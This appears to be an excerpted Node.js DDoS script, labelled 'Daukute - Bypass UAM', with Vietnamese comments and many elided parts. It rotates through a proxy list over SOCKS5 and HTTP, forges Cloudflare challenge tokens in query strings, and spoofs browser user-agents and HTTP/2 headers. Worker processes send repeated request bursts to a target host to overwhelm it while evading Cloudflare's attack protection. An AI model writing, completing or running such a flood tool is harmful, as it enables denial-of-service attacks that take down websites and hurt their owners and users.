...
npm install node-fetch@2 socks hpack colors
*/
...
function generateRandomQueryString() {
    const params = new URLSearchParams();
    const randomParamCount = Math.floor(Math.random() * 5) + 1;
    for (let i = 0; i < randomParamCount; i++) {
        const key = generateRandomString(5, 10);
        const value = generateRandomString(5, 15);
        params.append(key, value);
    }
    return params.toString();
}

// const queryString = generateRandomQueryString(); random ngẫu nhiên

// const queryString = `__cf_chl_tk=${generateRandomString(20, 30)}&__cf_chl_rt_tk=${generateRandomString(20, 30)}`;

const timestampString = Math.floor(Date.now() / 1000); // Unix timestamp
const queryString = `__cf_chl_tk=${generateRandomString(20, 30)}&__cf_chl_rt_tk=${generateRandomString(20, 30)}_${timestampString}-0-gaNy${generateRandomString(8)}`;
    ...
    async SOCKS5(options, callback) {
        ...
        socks.createConnection({
            ...
            if (error) {
                ...
                callback(info.socket, undefined);
            }
        });
    }
    ...
    HTTP(options, callback) {
        ...
        connection.on("data", chunk => {
            ...
            if (response.includes("HTTP/1.1 200")) {
                ...
                connection.destroy();
                callback(undefined, "Invalid response from proxy.");
            }
        });

        connection.on("timeout", () => {
            connection.destroy();
            callback(undefined, "Connection timeout.");
        });
    }
}
...
async function getIPAndISP(url) {
    try {
        ...
        if (response.ok) {
            ...
            isp = data.isp;
            console.log('ISP', url, 'Protect by', isp);
        } else {
            return;
        }
    } catch (error) {
...
function countProxies(proxyFile) {
    try {
        const data = fs.readFileSync(proxyFile, 'utf8');
        const lines = data.split(/\r?\n/);
        const proxyCount = lines.filter(line => line.trim() !== '').length;
        return proxyCount;
    } catch (err) {
...
const proxyCount = countProxies(args.proxyFile);
...
if (cluster.isMaster) {
    console.clear();
    console.log(`[!] Daukute - Bypass UAM`);
    console.log(`--------------------------------------------`.gray);
    ...
    console.log(`ProxyFile: `.red + args.proxyFile.white + ` | Total: `.red + proxyCount.toString().white);
    console.log(`--------------------------------------------`.gray);
...
const generateHeaders = (browser) => {
    const versions = {
        chrome: { min: 124, max: 130 },
        safari: { min: 14, max: 18 },
        brave: { min: 125, max: 130 },
        firefox: { min: 126, max: 130 },
        mobile: { min: 127, max: 130 },
        opera: { min: 123, max: 130 },
        operagx: { min: 122, max: 130 }
    };
    ...
    const fullVersions = {
        ...
        firefox: "130.0.6723.70",
        safari: "18.1",
        mobile: "130.0.6723.70",
        opera: "130.0.6723.70",
        operagx: "130.0.6723.70"
    };
    ...
    const userAgent = {
        chrome: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/${version}.0.6668.71 Safari/604.1`,
        safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 14_${version}_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Safari/604.1`,
        brave: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/${version}.0.6668.71 Safari/604.1`,
        firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0.6668.71`,
        mobile: `Mozilla/5.0 (Linux; Android 14; Mobile) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/${version}.0.6668.71 Mobile Safari/604.1`,
        opera: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/${version}.0.6668.71 Safari/604.1`,
        operagx: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/${version}.0.6668.71 Safari/604.1`
    };
    ...
    const headersMap = {
        brave: {
            ...
            ":authority": parsedTarget.host.startsWith('www.') ? parsedTarget.host : (Math.random() < 0.5 ? parsedTarget.host : 'www.' + parsedTarget.host),
            ":scheme": "https",
            ":path": `${parsedTarget.path}?${queryString}`,
    ...
    const intervalId = setInterval(() => {
        async function sendRequests() {
            ...
            ...(Math.random() < 0.5 && { rhd: [randomItem(rhd)] }),
                ...
                ...generateHeaders(browser).dynheader, // Thêm dynheader vào dây,
                ...allHeaders,
                ...dyn2,
